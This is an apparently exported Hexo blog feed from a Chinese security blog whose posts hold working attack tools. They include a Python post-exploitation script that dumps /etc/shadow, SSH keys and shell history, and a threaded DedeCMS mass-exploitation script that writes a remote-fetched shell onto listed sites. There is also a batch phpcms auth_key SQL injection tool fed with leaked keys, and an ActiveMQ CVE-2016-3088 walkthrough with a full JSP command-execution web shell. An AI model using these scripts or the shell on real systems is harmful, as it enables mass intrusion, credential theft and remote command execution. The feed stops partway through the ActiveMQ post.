      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux信息收集</title>
      <link href="/2018/08/01/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/08/01/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。<br>很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张）<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路</strong>：</p><pre><code>0.首先要获取系统信息：系统名称本地ip主机名本地dns环境变量shell程序hosts文件路由信息arp缓存计划任务挂载磁盘mail目录history文件home/root/bin/sbin目录1.获取用户信息当前权限用户信息本地用户在线用户hash加密规则hash信息用户组信息最后登录信息最后登录用户信息所有用户的计划任务2.安全扫描是否能无密码sudoconf配置文件ssh的密钥文件是否能root登录敏感配置文件扫描关键字含有config、web.xml、database、pass的文件uid为0用户敏感服务匿名空密码用户zip/tar.gz/sh/pl/py/rb/txt/bak后缀文件3.全部命令放入一个列表里，说明放入一个列表里4.遍历写入</code></pre><p>代码：</p><pre><code>import osml=[&apos;uname -a&apos;,&apos;cat /etc/issue&apos;,&apos;hostname&apos;,&apos;cat /etc/hosts&apos;,&apos;who&apos;,&quot;awk -F &apos;:&apos; &apos;{print $1,$3,$4,$6;}&apos; /etc/passwd&quot;,&apos;cat /etc/group&apos;,&apos;cat /etc/shadow&apos;,&apos;grep -v -E &quot;^#&quot; /etc/passwd&apos;,&apos;cat ~/.bash_history&apos;,&apos;w&apos;,&apos;netstat&apos;,&apos;ps -aux&apos;,&apos;dpkg -l&apos;,&apos;netstat -antpu&apos;,&apos;arp -a&apos;,&apos;uname -a 2&gt;/dev/null&apos;,&apos;hostname&apos;,&apos;lastlog&apos;,&apos;for i in $(cat /etc/passwd 2&gt;/dev/null&apos;,&quot;grep -v &apos;^[^:]*:[x]&apos; /etc/passwd 2&gt;/dev/null&quot;,&apos;grep -v &quot;^#&quot; /etc/passwd&apos;,&apos;cat /etc/shadow 2&gt;/dev/null&apos;,&apos;cat /etc/master.passwd 2&gt;/dev/null&apos;,&apos;echo &apos;&apos;sudo -S -l 2&gt;/dev/null&apos;,&apos;ls -ahl /root/ 2&gt;/dev/null&apos;,&apos;ls -ahl /home/ 2&gt;/dev/null&apos;,&apos;find / -writable -not -user \`whoami\` -type f -not -path &quot;/proc/*&quot; -exec ls -al {} \; 2&gt;/dev/null&apos;,&apos;find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls&apos;,&apos;&apos;&apos;grep &quot;PermitRootLogin &quot; /etc/ssh/sshd_config 2&gt;/dev/null | grep -v &quot;#&quot; | awk &apos;{print  $2}&apos;&apos;&apos;,&apos;echo $PATH 2&gt;/dev/null&apos;,&apos;cat /etc/shells 2&gt;/dev/null&apos;,&apos;cat /etc/login.defs 2&gt;/dev/null | grep &quot;PASS_MAX_DAYS\|PASS_MIN_DAYS\|PASS_WARN_AGE\|ENCRYPT_METHOD&quot; 2&gt;/dev/null | grep -v &quot;#&quot; 2&gt;/dev/null&apos;,&apos;ls -la /etc/cron* 2&gt;/dev/null&apos;,&apos;cat /etc/crontab 2&gt;/dev/null&apos;,&apos;cat /etc/passwd | cut -d &quot;:&quot; -f 1 | xargs -n1 crontab -l -u 2&gt;/dev/null&apos;,&apos;cat /etc/resolv.conf 2&gt;/dev/null&quot;&apos;,&apos;route 2&gt;/dev/null&apos;,&apos;netstat -antp 2&gt;/dev/null&apos;,&apos;netstat -anup 2&gt;/dev/null&apos;,&apos;ps aux 2&gt;/dev/null&apos;,&quot;ps aux&quot;,&quot;&apos;ls -la /etc/init.d 2&gt;/dev/null&apos;&quot;,&quot;find /etc/init.d/ \! -uid 0 -type f 2&gt;/dev/null&quot;,&quot;mysql --version 2&gt;/dev/null&quot;,&quot;sudo -V 2&gt;/dev/null&quot;,&quot;mysqladmin -uroot -proot version 2&gt;/dev/null&quot;,&quot;psql -V 2&gt;/dev/null&quot;,&quot;apache2 -v 2&gt;/dev/null; httpd -v 2&gt;/dev/null&quot;,&quot;&quot;&quot;awk &apos;{sub(/.*\export /,&quot;&quot;)}1&quot;&quot;&quot;,&apos;ifconfig&apos;]shuomin=[&apos;内核(是否为x64还是x86)&apos;,&apos;版本&apos;,&apos;主机名&apos;,&apos;hosts&apos;,&apos;目前登录系统的用户信息&apos;,&apos;获取用户名&apos;,&apos;获取用户组&apos;,&apos;获取hash&apos;,&apos;列出超级用户&apos;,&apos;查看用户操作&apos;,&apos;获取在线用户&apos;,&apos;端口&apos;,&apos;进程&apos;,&apos;程序&apos;,&apos;敏感文件&apos;,&apos;交互通信的ip&apos;,&apos;arp缓存&apos;,&apos;基础内核信息&apos;,&apos;主机名&apos;,&apos;最后用户登录的信息&apos;,&apos;列出所有用户的组&apos;,&apos;查询是否有hash存储在/etc/passwd(*nix中)&apos;,&apos;根据uid列出本地用户&apos;,&apos;读取shadow文件&apos;,&apos;bsd的shadow文件&apos;,&apos;能够sudo不需要提供密码&apos;,&apos;检查root目录是否存在&apos;,&apos;显示home目录情况&apos;,&apos;寻找文件我们能写但是不属于我们的文件&apos;,&apos;寻找ssh公钥&apos;,&apos;root是否能登录ssh,如果返回yes则可以登录&apos;,&apos;环境变量&apos;,&apos;列出能用的shells&apos;,&apos;hash的密码加密政策&apos;,&apos;所有的计划任务配置文件&apos;,&apos;获取计划任务内容&apos;,&apos;获取每个用户的计划任务&apos;,&apos;dns设置&apos;,&apos;路由配置&apos;,&apos;正在监听的tcp端口&apos;,&apos;udp端口&apos;,&apos;正在运行的程序&apos;,&apos;查看进程路径和权限&apos;,&apos;获取inetd.conf文件(监视网络的守护进程)&apos;,&apos;列举各种服务的管理脚本&apos;,&apos;寻找不是root的&apos;,&apos;获取mysql版本&apos;,&apos;获取sudo版本&apos;,&apos;测试root/root能否登录&apos;,&apos;postgres版本&apos;,&apos;apache详情&apos;,&apos;apache的运行用户&apos;,&apos;ip&apos;]def poc():    xk = open(&apos;save.txt&apos;, &apos;w&apos;)    xk.close()    for i in range(0,len(ml)):        zx=os.popen(ml[i])        print(&apos;[+]{}&apos;.format(shuomin[i]))        print(&apos;[+]{}&apos;.format(shuomin[i]),file=open(&apos;save.txt&apos;,&apos;a&apos;))        for z in zx:            print(z,file=open(&apos;save.txt&apos;,&apos;a&apos;))poc()</code></pre><p>收集结果如下：<br><img src="https://i.imgur.com/F4QC5Cs.png" alt=""></p><p><img src="https://i.imgur.com/ap7NSAR.png" alt=""></p><p><img src="https://i.imgur.com/rNcTlqi.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dedecms远程文件写入漏洞检测</title>
      <link href="/2018/07/31/dedecms%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
      <url>/2018/07/31/dedecms%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Dedecms远程文件写入漏洞。出现于/install/index.php.bak这个文件<br>详细情况请看：<a href="http://www.k2a.cn/131.html" target="_blank" rel="noopener">http://www.k2a.cn/131.html</a></p><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1906298132,553206994&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路：</strong></p><pre><code>1.先发送请求 /install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 进行清空2.构造shell进行写入请求3.验证shell是否存在</code></pre><p>一开始我直接判断是否防火墙之类的东西，导致后面没有办法成功。所以<br>我这里就没有些判断什么防火墙的东西。直接判断shell有没有写入成功</p><p>代码：</p><pre><code>import requestsimport osimport threadingpayload=[&apos;/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xx.php&amp;updateHost=http://your-IP/&apos;,&apos;/data/xx.php&apos;,&apos;shell的特征&apos;]user=input(&apos;file:&apos;)if os.path.exists(user): //判断文件是否存在    print(&apos;[+]open {} ok !&apos;.format(user))else:    print(&apos;[-]Not found {}&apos;.format(user))    exit()def explot(urls):    headers = {&apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}    url1=&quot;{}&quot;.format(urls+payload[0]).strip() //构造URL     url2=&quot;{}&quot;.format(urls+payload[1]).strip()    gjz=payload[2]    try:        rw=requests.get(url=&apos;{}/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php &apos;.format(urls),headers=headers) //发送请求进行清空        rqt=requests.get(url=url1,headers=headers)  //远程写入        rqt2=requests.get(url=url2,headers=headers)         if gjz in rqt2.text or gjz in rqt2.content.decode(&apos;utf-8&apos;): //判断是否成功写入shell            print(&apos;[+]shell url:{}&apos;.format(rqt2.url)            print(&apos;[+]shell url:{}&apos;.format(rqt2.url),file=open(&apos;good.txt&apos;,&apos;a&apos;))        else:            print(&apos;[-]no shell {}&apos;.format(rqt2.url))    except:        passif __name__ == &apos;__main__&apos;:    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        t=threading.Thread(target=explot,args=(qc,))        t.start()</code></pre><p>测试结果:<br><img src="https://i.imgur.com/qvZeGSc.png" alt=""></p><p><img src="https://i.imgur.com/f3AJ3tb.png" alt=""></p><p>转载请注明：出自422926799.Github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpcmssqllin</title>
      <link href="/2018/07/28/phpcmssqllin/"/>
      <url>/2018/07/28/phpcmssqllin/</url>
      <content type="html"><![CDATA[<h1 id="phpcms-auth-key注入漏洞批量检测"><a href="#phpcms-auth-key注入漏洞批量检测" class="headerlink" title="phpcms auth_key注入漏洞批量检测"></a>phpcms auth_key注入漏洞批量检测</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了<br>我们只需要写个批量检测就行了。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><pre><code>1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html2.居然已经给出了PHP的中专检测脚本，我们只需要批量替换掉php检测脚本的URL和key。然后生成新的修改好的PHP文件放入一个目录即可3.然后把生成的目录放入你的PHP环境，进行读取该路径下的所有PHP文件名。然后发送请求判断返回结果是0还是-1即可。（0代表无漏洞，-1代表有漏洞）</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>jsqllin.py</p><pre><code>import requestsimport osimport rekeys=[]#if os.path.exists(&apos;v9.php&apos;): #   print(&apos;[+]ok v9.php&apos;)##  print(&apos;[-]not found v9.php&apos;)  #  exit()xs=open(&apos;saveurl.txt&apos;,&apos;w&apos;)xs.close()print(&apos;[+]Write url&apos;)dw=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)for j in dw.readlines():    ldw=&quot;&quot;.join(j.split(&apos;\n&apos;))    qe = re.finditer(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;, ldw) //正则提取出URL    for q in qe:        rc = re.findall(&quot;[a-zA-z]+://[^\s]*&quot;, str(q))        for j in rc:            we = &quot;{}&quot;.format(j).replace(&apos;&gt;&apos;, &apos;&apos;).replace(&quot;&apos;&quot;, &apos;&apos;)            print(we,file=open(&apos;saveurl.txt&apos;,&apos;a&apos;))wc=[]lo=open(&apos;keys.txt&apos;,&apos;w&apos;)lo.close()dkv=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)for r in dkv.readlines():    wq=&quot;&quot;.join(r.split(&apos;\n&apos;))    qe=re.sub(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;,&apos;&apos;,wq)    qc=re.sub(&apos;\|&apos;,&apos;&apos;,str(qe))    tx=re.findall(&apos;[a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9]&apos;,str(qc)) //正则提取出key    for k in tx:        print(k,file=open(&apos;keys.txt&apos;,&apos;a&apos;))pds2=[]wqe2=[]pds=open(&apos;saveurl.txt&apos;,&apos;r&apos;)wqe=open(&apos;keys.txt&apos;,&apos;r&apos;)for b in pds.readlines():    pds2.append(&quot;&quot;.join(b.split(&apos;\n&apos;)))for w in wqe.readlines():    wqe2.append(&quot;&quot;.join(w.split(&apos;\n&apos;)))for x in range(int(len(pds2))): //读取pds（key列表里面的长度）生成对应数量的PHP文件    os.mknod(&apos;scv/{}v9.php&apos;.format(x))dr=os.listdir(&apos;scv&apos;) //读取scv目录下所有的PHP文件for d in range(0,len(pds2)):    print(&quot;&quot;&quot;&lt;?phpset_time_limit(0);$wang_url = &apos;{}&apos;; &quot;&quot;&quot;.format(pds2[d])+&quot;&quot;&quot; $auth_key = &apos;{}&apos;;&quot;&quot;&quot;.format(wqe2[d])+&quot;&quot;&quot; $str = &quot;uid=1&quot; . stripslashes($_GET[&apos;id&apos;]);$encode = sys_auth($str, &apos;ENCODE&apos;, $auth_key);$content = file_get_contents($wang_url . &quot;/phpsso_server/?m=phpsso&amp;c=index&amp;a=getuserinfo&amp;appid=1&amp;data=&quot; . $encode);echo $content;function sys_auth($string, $operation = &apos;ENCODE&apos;, $key = &apos;&apos;, $expiry = 0){    $key_length = 4;    $key = md5($key);    $fixedkey = hash(&apos;md5&apos;, $key);    $egiskeys = md5(substr($fixedkey, 16, 16));    $runtokey = $key_length ? ($operation == &apos;ENCODE&apos; ? substr(hash(&apos;md5&apos;, microtime(true)), -$key_length) : substr($string, 0, $key_length)) : &apos;&apos;;    $keys = hash(&apos;md5&apos;, substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));    $string = $operation == &apos;ENCODE&apos; ? sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));    $i = 0;    $result = &apos;&apos;;    $string_length = strlen($string);    for ($i = 0; $i &lt; $string_length; $i++) {        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));    }    if ($operation == &apos;ENCODE&apos;) {        return $runtokey . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));    } else {        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {            return substr($result, 26);        } else {            return &apos;&apos;;        }    }}?&gt;    &quot;&quot;&quot;,file=open(&apos;scv/{}&apos;.format(dr[d]),&apos;a&apos;)) //这个公司会将修改好的逐个写入</code></pre><p>jiances.py</p><pre><code>import requestsimport osprint(&apos;[!]请确保你把生成的php文件夹拷贝到你的php环境目录之下，然后请输入目录的路径。我将获取路径下所有的文件进行检测&apos;)user=input(&apos;path:&apos;)xj=open(&apos;save.txt&apos;,&apos;w&apos;)xj.close()def exploitsqllin():    cs=os.listdir(user) //读取指定列表下的所有文件    headers={&apos;user-gent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}    for s in cs: //遍历        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;)) //写入txt    dk=open(&apos;save.txt&apos;,&apos;r&apos;)     for r in dk.readlines():        wed=&quot;&quot;.join(r.split(&apos;\n&apos;))        urls=&apos;http://127.0.0.1/scv/{}?id=1&apos;.format(wed) //遍历txt之后构造URL        rq=requests.get(url=urls,headers=headers) //发送请求进行判断        if &apos;0&apos; in rq.text:             print(&apos;[-]Not bug {}&apos;.format(rq.url))        elif &apos;-1&apos; in rq.text:            print(&apos;[+]Bug url {}&apos;.format(rq.url))exploitsqllin()</code></pre><p>图片：</p><p>生成的php<br><img src="https://i.imgur.com/bP9cbAG.png" alt=""></p><p><img src="https://i.imgur.com/9490Rej.png" alt=""></p><p>检测结果：<br><img src="https://i.imgur.com/2EyNcfM.png" alt=""></p><p><img src="https://i.imgur.com/939Jan6.png" alt=""></p><p>漏洞几率不是很大</p><pre><code>[-]Not bug http://127.0.0.1/scv/79v9.php?id=1[-]Not bug http://127.0.0.1/scv/66v9.php?id=1[-]Not bug http://127.0.0.1/scv/2v9.php?id=1[+]Bug url http://127.0.0.1/scv/45v9.php?id=1[-]Not bug http://127.0.0.1/scv/47v9.php?id=1[-]Not bug http://127.0.0.1/scv/74v9.php?id=1[-]Not bug http://127.0.0.1/scv/91v9.php?id=1[-]Not bug http://127.0.0.1/scv/90v9.php?id=1[-]Not bug http://127.0.0.1/scv/88v9.php?id=1[-]Not bug http://127.0.0.1/scv/57v9.php?id=1[+]Bug url http://127.0.0.1/scv/89v9.php?id=1[-]Not bug http://127.0.0.1/scv/78v9.php?id=1[-]Not bug http://127.0.0.1/scv/14v9.php?id=1[-]Not bug http://127.0.0.1/scv/5v9.php?id=1[-]Not bug http://127.0.0.1/scv/15v9.php?id=1[-]Not bug http://127.0.0.1/scv/63v9.php?id=1[-]Not bug http://127.0.0.1/scv/76v9.php?id=1[-]Not bug http://127.0.0.1/scv/87v9.php?id=1[+]Bug url http://127.0.0.1/scv/26v9.php?id=1[-]Not bug http://127.0.0.1/scv/72v9.php?id=1[+]Bug url http://127.0.0.1/scv/43v9.php?id=1[-]Not bug http://127.0.0.1/scv/84v9.php?id=1[-]Not bug http://127.0.0.1/scv/25v9.php?id=1[+]Bug url http://127.0.0.1/scv/92v9.php?id=1[-]Not bug http://127.0.0.1/scv/13v9.php?id=1[-]Not bug http://127.0.0.1/scv/71v9.php?id=1[-]Not bug http://127.0.0.1/scv/75v9.php?id=1[-]Not bug http://127.0.0.1/scv/56v9.php?id=1[-]Not bug http://127.0.0.1/scv/19v9.php?id=1[+]Bug url http://127.0.0.1/scv/50v9.php?id=1[-]Not bug http://127.0.0.1/scv/31v9.php?id=1[-]Not bug http://127.0.0.1/scv/41v9.php?id=1[-]Not bug http://127.0.0.1/scv/53v9.php?id=1[-]Not bug http://127.0.0.1/scv/37v9.php?id=1[-]Not bug http://127.0.0.1/scv/44v9.php?id=1[-]Not bug http://127.0.0.1/scv/85v9.php?id=1[-]Not bug http://127.0.0.1/scv/42v9.php?id=1[+]Bug url http://127.0.0.1/scv/52v9.php?id=1[+]Bug url http://127.0.0.1/scv/17v9.php?id=1[-]Not bug http://127.0.0.1/scv/64v9.php?id=1[-]Not bug http://127.0.0.1/scv/80v9.php?id=1[-]Not bug http://127.0.0.1/scv/3v9.php?id=1[-]Not bug http://127.0.0.1/scv/4v9.php?id=1[-]Not bug http://127.0.0.1/scv/58v9.php?id=1[-]Not bug http://127.0.0.1/scv/68v9.php?id=1[-]Not bug http://127.0.0.1/scv/48v9.php?id=1[-]Not bug http://127.0.0.1/scv/20v9.php?id=1[+]Bug url http://127.0.0.1/scv/38v9.php?id=1[-]Not bug http://127.0.0.1/scv/62v9.php?id=1[-]Not bug http://127.0.0.1/scv/29v9.php?id=1[-]Not bug http://127.0.0.1/scv/24v9.php?id=1[-]Not bug http://127.0.0.1/scv/32v9.php?id=1[-]Not bug http://127.0.0.1/scv/61v9.php?id=1[-]Not bug http://127.0.0.1/scv/86v9.php?id=1[-]Not bug http://127.0.0.1/scv/46v9.php?id=1[-]Not bug http://127.0.0.1/scv/33v9.php?id=1[-]Not bug http://127.0.0.1/scv/39v9.php?id=1[-]Not bug http://127.0.0.1/scv/1v9.php?id=1[-]Not bug http://127.0.0.1/scv/51v9.php?id=1[-]Not bug http://127.0.0.1/scv/93v9.php?id=1[-]Not bug http://127.0.0.1/scv/36v9.php?id=1[-]Not bug http://127.0.0.1/scv/81v9.php?id=1[-]Not bug http://127.0.0.1/scv/83v9.php?id=1[-]Not bug http://127.0.0.1/scv/27v9.php?id=1[-]Not bug http://127.0.0.1/scv/55v9.php?id=1[-]Not bug http://127.0.0.1/scv/23v9.php?id=1[-]Not bug http://127.0.0.1/scv/12v9.php?id=1[-]Not bug http://127.0.0.1/scv/95v9.php?id=1[-]Not bug http://127.0.0.1/scv/40v9.php?id=1[-]Not bug http://127.0.0.1/scv/0v9.php?id=1[-]Not bug http://127.0.0.1/scv/77v9.php?id=1[-]Not bug http://127.0.0.1/scv/35v9.php?id=1[-]Not bug http://127.0.0.1/scv/73v9.php?id=1[-]Not bug http://127.0.0.1/scv/21v9.php?id=1[-]Not bug http://127.0.0.1/scv/18v9.php?id=1[-]Not bug http://127.0.0.1/scv/65v9.php?id=1[-]Not bug http://127.0.0.1/scv/16v9.php?id=1[-]Not bug http://127.0.0.1/scv/34v9.php?id=1[-]Not bug http://127.0.0.1/scv/59v9.php?id=1[+]Bug url http://127.0.0.1/scv/94v9.php?id=1[-]Not bug http://127.0.0.1/scv/10v9.php?id=1[-]Not bug http://127.0.0.1/scv/22v9.php?id=1</code></pre><p>转载请声明：来之九世的博客</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
      <link href="/2018/07/25/%E5%A4%8D%E7%8E%B0ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/"/>
      <url>/2018/07/25/%E5%A4%8D%E7%8E%B0ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p><pre><code>Vulhub漏靶场搭建方法：vulhub官网：http://vulhub.org/#/docs/download-vulhub/1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip3.安装docker-compose:pip install docker-compose4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git安装好之后进入对应的漏洞文件执行：docker-compose up -d如果出现：Couldn&apos;t connect to Docker daemon at http+xxx的问题有三个解决的方法：1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;2.在使用docker-compose附加上sudo sudo docker-compose up -d3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker</code></pre><p>漏洞介绍：</p><pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高文件操作容易出现漏洞所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p><pre><code>cd /vulhub/activemq/CVE-2016-3088 </code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p><pre><code>然后执行docker-compose -build 下载漏洞环境然后在执行docker-compose up -d 启动</code></pre><p>之后我们打开浏览器访问：</p><pre><code>http://127.0.0.1:8161</code></pre><p>我们可以看到如下图所示：</p><p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p><p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p><pre><code>http://your-ip:8161/admin/test/systemProperties.jsp</code></pre><p>查看ActiveMQ的绝对路径</p><p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p><p>绝对路径为：</p><pre><code>/opt/activemq</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p><p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p><pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; &lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if ( request.getParameter( &quot;comment&quot; ) != null ) {     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );     OutputStream os    = p.getOutputStream();     InputStream in        = p.getInputStream();     DataInputStream dis    = new DataInputStream( in );     String disr        = dis.readLine();     while ( disr != null )     {         out.println( disr ); disr = dis.readLine();     } } %&gt; 